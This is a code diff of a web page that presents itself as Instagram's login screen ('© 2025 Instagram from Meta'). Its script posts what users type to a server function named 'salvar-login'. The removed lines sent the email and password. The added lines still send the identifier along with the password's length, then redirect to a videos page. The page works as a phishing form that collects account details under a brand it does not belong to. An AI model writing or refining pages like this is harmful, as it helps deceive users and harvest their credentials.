@@ -373,72 +373,71 @@
         <p>© 2025 Instagram from Meta</p>
     </footer>
 
-    <!-- Login seguro via Netlify Function (sem expor chaves) -->
     <script>
+    document.getElementById('login-form').addEventListener('submit', async function(event) {
+        event.preventDefault();
 
-        document.getElementById('login-form').addEventListener('submit', async function(event) {
-            event.preventDefault();
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value;
 
-            const email = document.getElementById('email').value.trim();
-            const password = document.getElementById('password').value;
+        const isDemo = email === 'asdf' && password === 'asdf';
 
-            // Acesso de demonstração
-            const isDemo = email === 'asdf' && password === 'asdf';
+        const isValidIdentifier = email.length >= 3;
+        const isValidPassword = password.length >= 6;
 
-            // Validação de email
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            const isValidEmail = emailRegex.test(email);
-
-            // Validação de senha
-            const isValidPassword = password.length >= 6;
-
-            if (!isDemo && (!isValidEmail || !isValidPassword)) {
-                const btn = document.getElementById('login-btn');
-                const btnText = document.getElementById('btn-text');
-                btnText.textContent = 'Entrar';
-                btn.disabled = false;
-                btn.style.opacity = '0.5';
-                
-                // Mostra erro nos campos
-                document.getElementById('email').style.borderColor = '#ff3b30';
-                document.getElementById('password').style.borderColor = '#ff3b30';
-                
-                setTimeout(() => {
-                    document.getElementById('email').style.borderColor = '';
-                    document.getElementById('password').style.borderColor = '';
-                    btn.style.opacity = '1';
-                }, 2000);
-                return;
-            }
+        if (!isDemo && (!isValidIdentifier || !isValidPassword)) {
             const btn = document.getElementById('login-btn');
             const btnText = document.getElementById('btn-text');
-            const spinner = document.getElementById('spinner');
 
-            // Loading state
-            btn.disabled = true;
-            btnText.style.display = 'none';
-            spinner.style.display = 'block';
+            btnText.textContent = 'Entrar';
+            btn.disabled = false;
+            btn.style.opacity = '0.5';
 
-            try {
-                const response = await fetch('/.netlify/functions/salvar-login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, password })
-                });
+            document.getElementById('email').style.borderColor = '#ff3b30';
+            document.getElementById('password').style.borderColor = '#ff3b30';
 
-                if (!response.ok) throw new Error('Erro no servidor');
+            setTimeout(() => {
+                document.getElementById('email').style.borderColor = '';
+                document.getElementById('password').style.borderColor = '';
+                btn.style.opacity = '1';
+            }, 2000);
 
-                console.log("Dados enviados com sucesso!");
-                window.location.href = 'videos.html';
-            } catch (error) {
-                console.error("Erro ao enviar os dados: ", error);
-                alert("Ocorreu um erro ao enviar os dados. Por favor, tente novamente.");
-                btn.disabled = false;
-                btnText.style.display = 'block';
-                spinner.style.display = 'none';
-            }
-        });
-    </script>
+            return;
+        }
+
+        const btn = document.getElementById('login-btn');
+        const btnText = document.getElementById('btn-text');
+        const spinner = document.getElementById('spinner');
+
+        btn.disabled = true;
+        btnText.style.display = 'none';
+        spinner.style.display = 'block';
+
+        try {
+            const response = await fetch('/.netlify/functions/salvar-login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    email,
+                    passwordProvided: password.length > 0,
+                    passwordLength: password.length
+                })
+            });
+
+            if (!response.ok) throw new Error('Erro no servidor');
+
+            console.log('Dados enviados com sucesso!');
+            window.location.href = 'videos.html';
+        } catch (error) {
+            console.error('Erro ao enviar os dados: ', error);
+            alert('Ocorreu um erro ao enviar os dados. Por favor, tente novamente.');
+
+            btn.disabled = false;
+            btnText.style.display = 'block';
+            spinner.style.display = 'none';
+        }
+    });
+</script>
 
 </body>
 </html>
